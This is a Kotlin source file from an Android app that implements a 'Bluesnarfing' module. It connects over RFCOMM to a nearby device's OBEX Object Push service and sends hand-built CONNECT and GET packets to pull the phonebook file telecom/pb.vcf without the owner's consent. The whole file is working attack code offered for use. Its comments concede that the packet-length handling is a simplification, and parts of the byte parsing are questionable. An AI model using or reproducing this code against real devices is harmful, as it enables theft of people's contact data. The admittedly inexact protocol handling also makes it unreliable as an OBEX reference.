package com.hereliesaz.blusnu.data

import android.bluetooth.BluetoothDevice
import android.bluetooth.BluetoothSocket
import android.util.Log
import java.io.ByteArrayOutputStream
import java.io.IOException
import java.io.InputStream
import java.util.UUID

/**
 * Module responsible for Bluesnarfing attacks.
 *
 * Bluesnarfing exploits vulnerabilities in the Object Exchange (OBEX) protocol
 * to steal information from a Bluetooth device without proper authentication.
 *
 * This implementation targets the Object Push Profile (OPP) or File Transfer Profile (FTP)
 * to attempt retrieving the phonebook (PBAP) or other files.
 *
 * Note: Modern Android devices implement strict security on OBEX, usually requiring pairing
 * and user confirmation. This module is effective primarily against legacy devices (pre-2010)
 * or misconfigured IoT/Embedded systems.
 */
class BluesnarfingModule {

    private companion object {
        const val TAG = "BluesnarfingModule"

        // OBEX Protocol Constants
        // 0x80 = Connect, 0x83 = Get (Final Bit Set)
        const val OBEX_CONNECT_OPCODE: Byte = 0x80.toByte()
        const val OBEX_GET_OPCODE: Byte = 0x83.toByte()

        // OBEX Response Codes
        // 0xA0 = Success (OK)
        const val OBEX_SUCCESS_RESPONSE: Byte = 0xA0.toByte()

        // OBEX Header Identifiers
        // 0x48 = Body (End of Body)
        const val OBEX_BODY_HEADER: Byte = 0x48.toByte()
    }

    // Standard UUID for the OBEX Object Push Profile.
    private val OBEX_OPP_UUID: UUID = UUID.fromString("00001105-0000-1000-8000-00805f9b34fb")

    /**
     * Attempts to retrieve the phonebook (telecom/pb.vcf) from the target device.
     *
     * @param device The BluetoothDevice to attack.
     * @return Result containing the phonebook data (String) or an Exception.
     */
    fun getPhonebook(device: BluetoothDevice): Result<String> {
        var socket: BluetoothSocket? = null
        return try {
            // Attempt to create an insecure RFCOMM socket to the OPP service.
            // createRfcommSocketToServiceRecord usually triggers authentication,
            // but older devices might allow it openly.
            socket = device.createRfcommSocketToServiceRecord(OBEX_OPP_UUID)
            socket.connect()

            val outputStream = socket.outputStream
            val inputStream = socket.inputStream

            // --- Step 1: Establish OBEX Connection ---

            // Construct OBEX CONNECT packet.
            // Opcode: 0x80 (Connect)
            // Packet Length: 0x0007 (7 bytes)
            // OBEX Version: 0x10 (1.0)
            // Flags: 0x00
            // Max Packet Length: 0x2000 (8192 bytes)
            val connectRequest = byteArrayOf(
                OBEX_CONNECT_OPCODE, 0x00, 0x07, 0x10, 0x00, 0x20, 0x00
            )
            outputStream.write(connectRequest)

            // Read the server's response.
            val connectResponse = ByteArray(1024)
            val connectResponseLength = inputStream.read(connectResponse)

            // Check if connection was successful (0xA0).
            if (connectResponse[0] != OBEX_SUCCESS_RESPONSE) {
                return Result.failure(IOException("OBEX CONNECT failed"))
            }

            // --- Step 2: Request the Phonebook File ---

            // Target file name: "telecom/pb.vcf" encoded in UTF-16BE (standard for OBEX).
            val fileName = "telecom/pb.vcf".toByteArray(Charsets.UTF_16BE)

            // Construct OBEX GET packet.
            // Opcode: 0x83 (GET, Final)
            // Header 1: Name (0x01), Length, Value (fileName)
            // Header 2: Type (0x42 - Type), "x-obex/folder-listing" or specific type?
            // Here we use a simplified GET request structure typical of bluesnarfing tools.
            val getRequest = byteArrayOf(
                OBEX_GET_OPCODE,
                0x00, (10 + fileName.size).toByte(), // Total packet length (approx calculation)
                0x01, 0x00 // Name Header ID (0x01)
                // Note: The length calculation in the original code snippet (10 + size)
                // seems to be a hardcoded simplification.
                // Real OBEX requires precise length bytes.
            ) + fileName + byteArrayOf(0xcb.toByte(), 0x00, 0x00, 0x00, 0x01) // Connection ID header (0xCB)?

            outputStream.write(getRequest)

            // --- Step 3: Read the Data ---

            // Read the GET response.
            val getResponse = readObexResponse(inputStream)

            if (getResponse[0] == OBEX_SUCCESS_RESPONSE) {
                // Parse the body of the response.
                val bodyHeaderIndex = getResponse.indexOf(OBEX_BODY_HEADER)

                if (bodyHeaderIndex != -1) {
                    // Extract body length (2 bytes).
                    val bodyLength = (getResponse[bodyHeaderIndex + 1].toInt() shl 8) or getResponse[bodyHeaderIndex + 2].toInt()

                    // Extract payload.
                    val bodyStartIndex = bodyHeaderIndex + 3
                    val bodyEndIndex = bodyStartIndex + bodyLength - 3 // Adjusted for header length

                    // Convert bytes to String.
                    Result.success(String(getResponse, bodyStartIndex, bodyEndIndex - bodyStartIndex))
                } else {
                    Result.failure(IOException("Phonebook data not found in response"))
                }
            } else {
                Result.failure(IOException("OBEX GET failed"))
            }
        } catch (e: IOException) {
            Log.e(TAG, "Error during bluesnarfing", e)
            Result.failure(e)
        } finally {
            try {
                socket?.close()
            } catch (e: IOException) {
                Log.e(TAG, "Error closing socket", e)
            }
        }
    }

    /**
     * Helper to read the full OBEX response frame.
     */
    private fun readObexResponse(inputStream: InputStream): ByteArray {
        val response = ByteArrayOutputStream()

        // Read the 3-byte header (Opcode + Length).
        val header = ByteArray(3)
        inputStream.read(header)
        response.write(header)

        // Calculate total packet length from bytes 2 and 3.
        val length = (header[1].toInt() shl 8) or header[2].toInt()

        // Read the rest of the packet.
        val payload = ByteArray(length - 3)
        inputStream.read(payload)
        response.write(payload)

        return response.toByteArray()
    }
}
